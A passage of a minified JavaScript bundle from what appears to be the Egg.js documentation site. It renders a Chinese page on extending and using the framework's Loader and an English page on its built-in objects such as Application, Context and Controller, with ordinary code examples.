\u9996\u5b57\u6bcd\u5927\u5199\uff0c",r.a.createElement("code",null,"app/model/user.js")," => ",r.a.createElement("code",null,"app.model.User"),"\uff0c\u5c31\u53ef\u4ee5\u6307\u5b9a ",r.a.createElement("code",null,"caseStyle: 'upper'"),"\u3002"),r.a.createElement("h2",{id:"\u6269\u5c55-loader"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55-loader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55 Loader"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/master/lib/loader/egg_loader.js"},"Loader")," \u662f\u4e00\u4e2a\u57fa\u7c7b\uff0c\u5e76\u6839\u636e\u6587\u4ef6\u52a0\u8f7d\u7684\u89c4\u5219\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5185\u7f6e\u7684\u65b9\u6cd5\uff0c\u5b83\u672c\u8eab\u5e76\u4e0d\u4f1a\u53bb\u8c03\u7528\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u800c\u662f\u7531\u7ee7\u627f\u7c7b\u8c03\u7528\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"loadPlugin()"),r.a.createElement("li",null,"loadConfig()"),r.a.createElement("li",null,"loadAgentExtend()"),r.a.createElement("li",null,"loadApplicationExtend()"),r.a.createElement("li",null,"loadRequestExtend()"),r.a.createElement("li",null,"loadResponseExtend()"),r.a.createElement("li",null,"loadContextExtend()"),r.a.createElement("li",null,"loadHelperExtend()"),r.a.createElement("li",null,"loadCustomAgent()"),r.a.createElement("li",null,"loadCustomApp()"),r.a.createElement("li",null,"loadService()"),r.a.createElement("li",null,"loadMiddleware()"),r.a.createElement("li",null,"loadController()"),r.a.createElement("li",null,"loadRouter()")),r.a.createElement("p",null,"Egg \u57fa\u4e8e Loader \u5b9e\u73b0\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/loader/app_worker_loader.js"},"AppWorkerLoader")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/loader/agent_worker_loader.js"},"AgentWorkerLoader"),"\uff0c\u4e0a\u5c42\u6846\u67b6\u57fa\u4e8e\u8fd9\u4e24\u4e2a\u7c7b\u6765\u6269\u5c55\uff0c",r.a.createElement("strong",null,"Loader \u7684\u6269\u5c55\u53ea\u80fd\u5728\u6846\u67b6\u8fdb\u884c"),"\u3002"),r.a.createElement(o["a"],{code:"// \u81ea\u5b9a\u4e49 AppWorkerLoader\n// lib/framework.js\nconst path = require('path');\nconst egg = require('egg');\nconst EGG_PATH = Symbol.for('egg#eggPath');\n\nclass YadanAppWorkerLoader extends egg.AppWorkerLoader {\n  constructor(opt) {\n    super(opt);\n    // \u81ea\u5b9a\u4e49\u521d\u59cb\u5316\n  }\n\n  loadConfig() {\n    super.loadConfig();\n    // \u5bf9 config \u8fdb\u884c\u5904\u7406\n  }\n\n  load() {\n    super.load();\n    // \u81ea\u5b9a\u4e49\u52a0\u8f7d\u5176\u4ed6\u76ee\u5f55\n    // \u6216\u5bf9\u5df2\u52a0\u8f7d\u7684\u6587\u4ef6\u8fdb\u884c\u5904\u7406\n  }\n}\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    return path.dirname(__dirname);\n  }\n  // \u8986\u76d6 Egg \u7684 Loader\uff0c\u542f\u52a8\u65f6\u4f7f\u7528\u8fd9\u4e2a Loader\n  get [EGG_LOADER]() {\n    return YadanAppWorkerLoader;\n  }\n}\n\nmodule.exports = Object.assign(egg, {\n  Application,\n  // \u81ea\u5b9a\u4e49\u7684 Loader \u4e5f\u9700\u8981 export\uff0c\u4e0a\u5c42\u6846\u67b6\u9700\u8981\u57fa\u4e8e\u8fd9\u4e2a\u6269\u5c55\n  AppWorkerLoader: YadanAppWorkerLoader,\n});",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7 Loader \u63d0\u4f9b\u7684\u8fd9\u4e9b API\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5b9a\u5236\u56e2\u961f\u7684\u81ea\u5b9a\u4e49\u52a0\u8f7d\uff0c\u5982 ",r.a.createElement("code",null,"this.model.xx"),"\uff0c",r.a.createElement("code",null,"app/extend/filter.js")," \u7b49\u7b49\u3002"),r.a.createElement("p",null,"\u4ee5\u4e0a\u53ea\u662f\u8bf4\u660e Loader \u7684\u5199\u6cd5\uff0c\u5177\u4f53\u53ef\u4ee5\u67e5\u770b",r.a.createElement(l["Link"],{to:"./framework"},"\u6846\u67b6\u5f00\u53d1"),"\u3002"),r.a.createElement("h2",{id:"\u52a0\u8f7d\u5668\u51fd\u6570loader-api"},r.a.createElement(l["AnchorLink"],{to:"#\u52a0\u8f7d\u5668\u51fd\u6570loader-api","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u52a0\u8f7d\u5668\u51fd\u6570\uff08Loader API\uff09"),r.a.createElement("p",null,"Loader \u8fd8\u63d0\u4f9b\u4e00\u4e9b\u5e95\u5c42\u7684 API\uff0c\u5728\u6269\u5c55\u65f6\u53ef\u4ee5\u7b80\u5316\u4ee3\u7801\uff0c",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core#eggloader"},"\u70b9\u51fb\u6b64\u5904"),"\u67e5\u770b\u6240\u6709\u76f8\u5173 API\u3002"),r.a.createElement("h3",{id:"loadfile"},r.a.createElement(l["AnchorLink"],{to:"#loadfile","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"loadFile"),r.a.createElement("p",null,"\u7528\u4e8e\u52a0\u8f7d\u4e00\u4e2a\u6587\u4ef6\uff0c\u6bd4\u5982\u52a0\u8f7d ",r.a.createElement("code",null,"app/xx.js")," \u5c31\u662f\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002"),r.a.createElement(o["a"],{code:"// app/xx.js\nmodule.exports = (app) => {\n  console.log(app.config);\n};\n\n// app.js\n// \u4ee5 app/xx.js \u4e3a\u4f8b\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 app.js \u52a0\u8f7d\u8fd9\u4e2a\u6587\u4ef6\nconst path = require('path');\nmodule.exports = (app) => {\n  app.loader.loadFile(path.join(app.config.baseDir, 'app/xx.js'));\n};",lang:"js"}),r.a.createElement("p",null,"\u5982\u679c\u6587\u4ef6 export \u4e00\u4e2a\u51fd\u6570\u4f1a\u88ab\u8c03\u7528\uff0c\u5e76\u5c06 app \u4f5c\u4e3a\u53c2\u6570\uff0c\u5426\u5219\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u503c\u3002"),r.a.createElement("h3",{id:"loadtoapp"},r.a.createElement(l["AnchorLink"],{to:"#loadtoapp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"loadToApp"),r.a.createElement("p",null,"\u7528\u4e8e\u52a0\u8f7d\u4e00\u4e2a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5230 app\uff0c\u6bd4\u5982 ",r.a.createElement("code",null,"app/controller/home.js")," \u4f1a\u52a0\u8f7d\u5230 ",r.a.createElement("code",null,"app.controller.home"),"\u3002"),r.a.createElement(o["a"],{code:"// app.js\n// \u4ee5\u4e0b\u53ea\u662f\u793a\u4f8b\uff0c\u52a0\u8f7d controller \u8bf7\u7528 loadController\nmodule.exports = (app) => {\n  const directory = path.join(app.config.baseDir, 'app/controller');\n  app.loader.loadToApp(directory, 'controller');\n};",lang:"js"}),r.a.createElement("p",null,"\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570 ",r.a.createElement("code",null,"loadToApp(directory, property, LoaderOptions)")),r.a.createElement("ol",null,r.a.createElement("li",null,"directory \u53ef\u4ee5\u4e3a String \u6216 Array\uff0cLoader \u4f1a\u4ece\u8fd9\u4e9b\u76ee\u5f55\u52a0\u8f7d\u6587\u4ef6"),r.a.createElement("li",null,"property \u4e3a app \u7684\u5c5e\u6027"),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#LoaderOptions"},"LoaderOptions")," \u4e3a\u4e00\u4e9b\u914d\u7f6e")),r.a.createElement("h3",{id:"loadtocontext"},r.a.createElement(l["AnchorLink"],{to:"#loadtocontext","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"loadToContext"),r.a.createElement("p",null,"\u4e0e loadToApp \u6709\u4e00\u70b9\u5dee\u5f02\uff0cloadToContext \u662f\u52a0\u8f7d\u5230 ctx \u4e0a\u800c\u975e app\uff0c\u800c\u4e14\u662f\u61d2\u52a0\u8f7d\u3002\u52a0\u8f7d\u65f6\u4f1a\u5c06\u6587\u4ef6\u90fd\u653e\u5230\u4e00\u4e2a\u4e34\u65f6\u5bf9\u8c61\u4e0a\uff0c\u5728\u8c03\u7528 ctx API \u65f6\u624d\u5b9e\u4f8b\u5316\u5bf9\u8c61\u3002"),r.a.createElement("p",null,"\u6bd4\u5982 service \u7684\u52a0\u8f7d\u5c31\u662f\u4f7f\u7528\u8fd9\u79cd\u6a21\u5f0f"),r.a.createElement(o["a"],{code:"// \u4ee5\u4e0b\u4e3a\u793a\u4f8b\uff0c\u8bf7\u4f7f\u7528 loadService\n// app/service/user.js\nconst Service = require('egg').Service;\nclass UserService extends Service {}\nmodule.exports = UserService;\n\n// app.js\n// \u83b7\u53d6\u6240\u6709\u7684 loadUnit\nconst servicePaths = app.loader\n  .getLoadUnits()\n  .map((unit) => path.join(unit.path, 'app/service'));\n\napp.loader.loadToContext(servicePaths, 'service', {\n  // service \u9700\u8981\u7ee7\u627f app.Service\uff0c\u6240\u4ee5\u8981\u62ff\u5230 app \u53c2\u6570\n  // \u8bbe\u7f6e call \u5728\u52a0\u8f7d\u65f6\u4f1a\u8c03\u7528\u51fd\u6570\u8fd4\u56de UserService\n  call: true,\n  // \u5c06\u6587\u4ef6\u52a0\u8f7d\u5230 app.serviceClasses\n  fieldClass: 'serviceClasses',\n});",lang:"js"}),r.a.createElement("p",null,"\u6587\u4ef6\u52a0\u8f7d\u540e ",r.a.createElement("code",null,"app.serviceClasses.user")," \u5c31\u662f UserService\uff0c\u5f53\u8c03\u7528 ",r.a.createElement("code",null,"ctx.service.user")," \u65f6\u4f1a\u5b9e\u4f8b\u5316 UserService\uff0c \u6240\u4ee5\u8fd9\u4e2a\u7c7b\u53ea\u6709\u6bcf\u6b21\u8bf7\u6c42\u4e2d\u9996\u6b21\u8bbf\u95ee\u65f6\u624d\u4f1a\u5b9e\u4f8b\u5316\uff0c\u5b9e\u4f8b\u5316\u540e\u4f1a\u88ab\u7f13\u5b58\uff0c\u540c\u4e00\u4e2a\u8bf7\u6c42\u591a\u6b21\u8c03\u7528\u4e5f\u53ea\u4f1a\u5b9e\u4f8b\u5316\u4e00\u6b21\u3002"),r.a.createElement("h3",{id:"loaderoptions"},r.a.createElement(l["AnchorLink"],{to:"#loaderoptions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"LoaderOptions"),r.a.createElement("h4",{id:"ignore-string"},r.a.createElement(l["AnchorLink"],{to:"#ignore-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ignore [String]"),r.a.createElement("p",null,r.a.createElement("code",null,"ignore")," \u53ef\u4ee5\u5ffd\u7565\u4e00\u4e9b\u6587\u4ef6\uff0c\u652f\u6301 glob\uff0c\u9ed8\u8ba4\u4e3a\u7a7a"),r.a.createElement(o["a"],{code:"app.loader.loadToApp(directory, 'controller', {\n  // \u5ffd\u7565 app/controller/util \u4e0b\u7684\u6587\u4ef6\n  ignore: 'util/**',\n});",lang:"js"}),r.a.createElement("h4",{id:"initializer-function"},r.a.createElement(l["AnchorLink"],{to:"#initializer-function","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"initializer [Function]"),r.a.createElement("p",null,"\u5bf9\u6bcf\u4e2a\u6587\u4ef6 export \u51fa\u6765\u7684\u503c\u8fdb\u884c\u5904\u7406\uff0c\u9ed8\u8ba4\u4e3a\u7a7a"),r.a.createElement(o["a"],{code:"// app/model/user.js\nmodule.exports = class User {\n  constructor(app, path) {}\n};\n\n// \u4ece app/model \u76ee\u5f55\u52a0\u8f7d\uff0c\u52a0\u8f7d\u65f6\u53ef\u505a\u4e00\u4e9b\u521d\u59cb\u5316\u5904\u7406\nconst directory = path.join(app.config.baseDir, 'app/model');\napp.loader.loadToApp(directory, 'model', {\n  initializer(model, opt) {\n    // \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a export \u7684\u5bf9\u8c61\n    // \u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ea\u5305\u542b\u5f53\u524d\u6587\u4ef6\u7684\u8def\u5f84\n    return new model(app, opt.path);\n  },\n});",lang:"js"}),r.a.createElement("h4",{id:"casestyle-string"},r.a.createElement(l["AnchorLink"],{to:"#casestyle-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"caseStyle [String]"),r.a.createElement("p",null,"\u6587\u4ef6\u7684\u8f6c\u6362\u89c4\u5219\uff0c\u53ef\u9009\u4e3a ",r.a.createElement("code",null,"camel"),"\uff0c",r.a.createElement("code",null,"upper"),"\uff0c",r.a.createElement("code",null,"lower"),"\uff0c\u9ed8\u8ba4\u4e3a ",r.a.createElement("code",null,"camel"),"\u3002"),r.a.createElement("p",null,"\u4e09\u8005\u90fd\u4f1a\u5c06\u6587\u4ef6\u540d\u8f6c\u6362\u6210\u9a7c\u5cf0\uff0c\u4f46\u662f\u5bf9\u4e8e\u9996\u5b57\u6bcd\u7684\u5904\u7406\u6709\u6240\u4e0d\u540c\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"camel"),"\uff1a\u9996\u5b57\u6bcd\u4e0d\u53d8\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"upper"),"\uff1a\u9996\u5b57\u6bcd\u5927\u5199\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"lower"),"\uff1a\u9996\u5b57\u6bcd\u5c0f\u5199\u3002")),r.a.createElement("p",null,"\u5728\u52a0\u8f7d\u4e0d\u540c\u6587\u4ef6\u65f6\u914d\u7f6e\u4e0d\u540c"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"\u6587\u4ef6"),r.a.createElement("th",null,"\u914d\u7f6e"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"lower")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"lower")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"lower")))),r.a.createElement("h4",{id:"override-boolean"},r.a.createElement(l["AnchorLink"],{to:"#override-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"override [Boolean]"),r.a.createElement("p",null,"\u9047\u5230\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\u65f6\u662f\u76f4\u63a5\u8986\u76d6\u8fd8\u662f\u629b\u51fa\u5f02\u5e38\uff0c\u9ed8\u8ba4\u4e3a false"),r.a.createElement("p",null,"\u6bd4\u5982\u540c\u65f6\u52a0\u8f7d\u5e94\u7528\u548c\u63d2\u4ef6\u7684 ",r.a.createElement("code",null,"app/service/user.js")," \u6587\u4ef6\uff0c\u5982\u679c\u4e3a true \u5e94\u7528\u4f1a\u8986\u76d6\u63d2\u4ef6\u7684\uff0c\u5426\u5219\u52a0\u8f7d\u5e94\u7528\u7684\u6587\u4ef6\u65f6\u4f1a\u62a5\u9519\u3002"),r.a.createElement("p",null,"\u5728\u52a0\u8f7d\u4e0d\u540c\u6587\u4ef6\u65f6\u914d\u7f6e\u4e0d\u540c"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"\u6587\u4ef6"),r.a.createElement("th",null,"\u914d\u7f6e"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"true")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"false")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"false")))),r.a.createElement("h4",{id:"call-boolean"},r.a.createElement(l["AnchorLink"],{to:"#call-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"call [Boolean]"),r.a.createElement("p",null,"\u5f53 export \u7684\u5bf9\u8c61\u4e3a\u51fd\u6570\u65f6\u5219\u8c03\u7528\uff0c\u5e76\u83b7\u53d6\u8fd4\u56de\u503c\uff0c\u9ed8\u8ba4\u4e3a true"),r.a.createElement("p",null,"\u5728\u52a0\u8f7d\u4e0d\u540c\u6587\u4ef6\u65f6\u914d\u7f6e\u4e0d\u540c"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"\u6587\u4ef6"),r.a.createElement("th",null,"\u914d\u7f6e"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"true")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"false")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"true")))),r.a.createElement("h2",{id:"customloader"},r.a.createElement(l["AnchorLink"],{to:"#customloader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"CustomLoader"),r.a.createElement("p",null,r.a.createElement("code",null,"loadToContext")," \u548c ",r.a.createElement("code",null,"loadToApp")," \u53ef\u88ab ",r.a.createElement("code",null,"customLoader")," \u914d\u7f6e\u66ff\u4ee3\u3002"),r.a.createElement("p",null,"\u5982\u4f7f\u7528 ",r.a.createElement("code",null,"loadToApp")," \u52a0\u8f7d\u7684\u4ee3\u7801\u5982\u4e0b"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  const directory = path.join(app.config.baseDir, 'app/adapter');\n  app.loader.loadToApp(directory, 'adapter');\n};",lang:"js"}),r.a.createElement("p",null,"\u6362\u6210 ",r.a.createElement("code",null,"customLoader")," \u540e\u53d8\u4e3a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  customLoader: {\n    // \u5b9a\u4e49\u5728 app \u4e0a\u7684\u5c5e\u6027\u540d app.adapter\n    adapter: {\n      // \u76f8\u5bf9\u4e8e app.config.baseDir\n      directory: 'app/adapter',\n      // \u5982\u679c\u662f ctx \u5219\u4f7f\u7528 loadToContext\n      inject: 'app',\n      // \u662f\u5426\u52a0\u8f7d\u6846\u67b6\u548c\u63d2\u4ef6\u7684\u76ee\u5f55\n      loadunit: false,\n      // \u8fd8\u53ef\u4ee5\u5b9a\u4e49\u5176\u4ed6 LoaderOptions\n    },\n  },\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},YtQ9:function(e,t,n){var a=n("AaXQ");e.exports=Array.isArray||function(e){return"Array"==a(e)}},Ytgo:function(e,t,n){var a=n("0mt+");a({target:"Math",stat:!0},{isubh:function(e,t,n,a){var r=e>>>0,l=t>>>0,o=n>>>0;return l-(a>>>0)-((~r&o|~(r^o)&r-o>>>0)>>>31)|0}})},Yu9L:function(e,t,n){var a=n("R+Ix");e.exports=/(iphone|ipod|ipad).*applewebkit/i.test(a)},"Z//x":function(e,t,n){var a=n("iYqF"),r=n("SgJm"),l="[object Symbol]";function o(e){return"symbol"==typeof e||r(e)&&a(e)==l}e.exports=o},Z3pt:function(e,t,n){var a=n("oyD1");e.exports=function(e,t,n,r){try{return r?t(a(n)[0],n[1]):t(n)}catch(o){var l=e["return"];throw void 0!==l&&a(l.call(e)),o}}},Z6Ce:function(e,t,n){var a=n("A0UU"),r=n("oi/H");r(a.JSON,"JSON",!0)},ZBQy:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"At this chapter, we will introduce some built-in basic objects in the framework, including four objects (Application, Context, Request, Response) inherited from ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," and some objects that extended by the framework (Controller, Service , Helper, Config, Logger), we will often see them in the follow-up documents."),r.a.createElement("h2",{id:"application"},r.a.createElement(l["AnchorLink"],{to:"#application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application"),r.a.createElement("p",null,"Application is a global application object, an application only instantiates one Application, it is inherited from ",r.a.createElement(l["Link"],{to:"http://koajs.com/#application"},"Koa.Application"),", we can mount some global methods and objects on it. We can easily [extend Application object] (./extend.md#Application) in plugin or application."),r.a.createElement("h3",{id:"events"},r.a.createElement(l["AnchorLink"],{to:"#events","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Events"),r.a.createElement("p",null,"Framework will emits some events when server running, application developers or plugin developers can listen on these events to do some job like logging. As application developers, we can listen on these events in ",r.a.createElement(l["Link"],{to:"./app-start"},"app start script"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"server"),": every worker will only emit once during the runtime, after HTTP server started, framework will expose HTTP server instance by this event."),r.a.createElement("li",null,r.a.createElement("code",null,"error"),": if any exception catched by onerror plugin, it will emit an ",r.a.createElement("code",null,"error")," event with the exception instance and current context instance(if have), developers can listen on this event to report or logging."),r.a.createElement("li",null,r.a.createElement("code",null,"request")," and ",r.a.createElement("code",null,"response"),": application will emit ",r.a.createElement("code",null,"request")," and ",r.a.createElement("code",null,"response")," event when receive requests and ended responses, developers can listen on these events to generate some digest log.")),r.a.createElement(o["a"],{code:"// app.js\n\nmodule.exports = (app) => {\n  app.once('server', (server) => {\n    // websocket\n  });\n  app.on('error', (err, ctx) => {\n    // report error\n  });\n  app.on('request', (ctx) => {\n    // log receive request\n  });\n  app.on('response', (ctx) => {\n    // ctx.starttime is set by framework\n    const used = Date.now() - ctx.starttime;\n    // log total cost\n  });\n};",lang:"js"}),r.a.createElement("h3",{id:"how-to-get"},r.a.createElement(l["AnchorLink"],{to:"#how-to-get","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Get"),r.a.createElement("p",null,"Application object can be accessed almost anywhere in application, here are a few commonly used access ways:"),r.a.createElement("p",null,"Almost all files (Controller, Service, Schedule, etc.) loaded by the [Loader] (../advanced/loader.md) can export a function that is called by the Loader and uses the app as a parameter:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./app-start"},"App start script")),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.cache = new Cache();\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./controller"},"Controller file")),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    this.ctx.body = this.app.cache.get(this.ctx.query.id);\n  }\n}",lang:"js"}))),r.a.createElement("p",null,"Like the ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa"),", on the Context object, we can access the Application object via ",r.a.createElement("code",null,"ctx.app"),". Use the above Controller file as an example:"),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    this.ctx.body = this.ctx.app.cache.get(this.ctx.query.id);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"In the instance objects that inherited from the Controller and Service base classes, the Application object can be accessed via ",r.a.createElement("code",null,"this.app"),"."),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    this.ctx.body = this.app.cache.get(this.ctx.query.id);\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"Context is a ",r.a.createElement("strong",null,"request level object"),", inherited from ",r.a.createElement(l["Link"],{to:"http://koajs.com/#context"},"Koa.Context"),". When a request is received every time, the framework instantiates a Context object that encapsulates the information requested by the user and provides a number of convenient ways to get the request parameter or set the response information. The framework will mount all of the ",r.a.createElement(l["Link"],{to:"./service"},"Service")," on the Context instance, and some plugins will mount some other methods and objects on it (",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")," will mount all the models on the Context)."),r.a.createElement("h3",{id:"how-to-get-1"},r.a.createElement(l["AnchorLink"],{to:"#how-to-get-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Get"),r.a.createElement("p",null,"The most common way to get the Context instance is in ",r.a.createElement(l["Link"],{to:"./middleware"},"Middleware"),", ",r.a.createElement(l["Link"],{to:"./controller"},"Controller"),", and ",r.a.createElement(l["Link"],{to:"./service"},"Service"),". The access method in the Controller is shown in the above example. In the Service, the access way is same as Controller. The access Context method in the Middleware of Egg is same as ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," framework gets the Context object in its middleware."),r.a.createElement("p",null,"The ",r.a.createElement(l["Link"],{to:"./middleware"},"Middleware")," of Egg also supports Koa v1 and Koa v2 two different middleware coding formats. use different format, the way to access Context instance is also slightly different:"),r.a.createElement(o["a"],{code:"// Koa v1\nfunction* middleware(next) {\n  // this is instance of Context\n  console.log(this.query);\n  yield next;\n}\n\n// Koa v2\nasync function middleware(ctx, next) {\n  // ctx is instance of Context\n  console.log(ctx.query);\n}",lang:"js"}),r.a.createElement("p",null,"In addition to the request can get the Context instance, in some non-request scenario we need to access service / model and other objects on the Context instance, we can use",r.a.createElement("code",null,"Application.createAnonymousContext ()")," method to create an anonymous Context instance:"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    const ctx = app.createAnonymousContext();\n    // preload before app start\n    await ctx.service.posts.load();\n  });\n};",lang:"js"}),r.a.createElement("p",null,"Each task in ",r.a.createElement(l["Link"],{to:"./schedule"},"Schedule")," takes a Context instance as a parameter so that we can more easily execute some schedule business logic:"),r.a.createElement(o["a"],{code:"// app/schedule/refresh.js\nexports.task = async (ctx) => {\n  await ctx.service.posts.refresh();\n};",lang:"js"}),r.a.createElement("h2",{id:"request--response"},r.a.createElement(l["AnchorLink"],{to:"#request--response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Request & Response"),r.a.createElement("p",null,"Request is a ",r.a.createElement("strong",null,"request level object"),", inherited from ",r.a.createElement(l["Link"],{to:"http://koajs.com/#request"},"Koa.Request"),". Encapsulates the Node.js native HTTP Request object, and provides a set of helper methods to get commonly used parameters of HTTP requests."),r.a.createElement("p",null,"Response is a ",r.a.createElement("strong",null,"request level object"),", inherited from ",r.a.createElement(l["Link"],{to:"http://koajs.com/#response"},"Koa.Response"),". Encapsulates the Node.js native HTTP Response object, and provides a set of helper methods to set the HTTP response."),r.a.createElement("h3",{id:"how-to-get-2"},r.a.createElement(l["AnchorLink"],{to:"#how-to-get-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Get"),r.a.createElement("p",null,"We can get the Request(",r.a.createElement("code",null,"ctx.request"),") and Response (",r.a.createElement("code",null," ctx.response"),") instances of the current request on the Context instance."),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    const { app, ctx } = this;\n    const id = ctx.request.query.id;\n    ctx.response.body = app.cache.get(id);\n  }\n}",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," will proxy some methods and properties of Request and Response on Context, see ",r.a.createElement(l["Link"],{to:"http://koajs.com/#context"},"Koa.Context"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.request.query.id")," and",r.a.createElement("code",null," ctx.query.id")," are equivalent in the above example , ",r.a.createElement("code",null,"ctx.response.body =")," and ",r.a.createElement("code",null,"ctx.body =")," are equivalent."),r.a.createElement("li",null,"It should be noted that get the body of POST should use ",r.a.createElement("code",null,"ctx.request.body")," instead of",r.a.createElement("code",null," ctx.body"),".")),r.a.createElement("h2",{id:"controller"},r.a.createElement(l["AnchorLink"],{to:"#controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller"),r.a.createElement("p",null,"Egg provides a Controller base class and recommends that all ",r.a.createElement(l["Link"],{to:"./controller"},"Controller")," inherit from the base class. The Controller base class has the following properties:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx")," - ",r.a.createElement(l["AnchorLink"],{to:"#context"},"Context")," instance of the current request."),r.a.createElement("li",null,r.a.createElement("code",null,"app")," - ",r.a.createElement(l["AnchorLink"],{to:"#application"},"Application")," instance."),r.a.createElement("li",null,r.a.createElement("code",null,"config")," - application ",r.a.createElement(l["Link"],{to:"./config"},"configuration"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"service")," - all 